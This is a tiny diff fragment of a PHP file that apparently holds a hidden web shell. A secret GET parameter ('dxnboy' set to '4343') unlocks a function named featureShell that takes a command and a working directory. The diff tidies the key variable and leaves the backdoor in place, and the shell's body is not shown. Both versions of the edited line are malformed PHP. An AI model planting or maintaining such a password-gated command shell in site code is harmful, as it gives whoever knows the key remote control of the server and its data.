@@ -1,5 +1,5 @@
 <?php
-dxnboy=1
+dxnboy = "";
 if($_GET["dxnboy"] === "4343") {
 
 function featureShell($cmd, $cwd) {
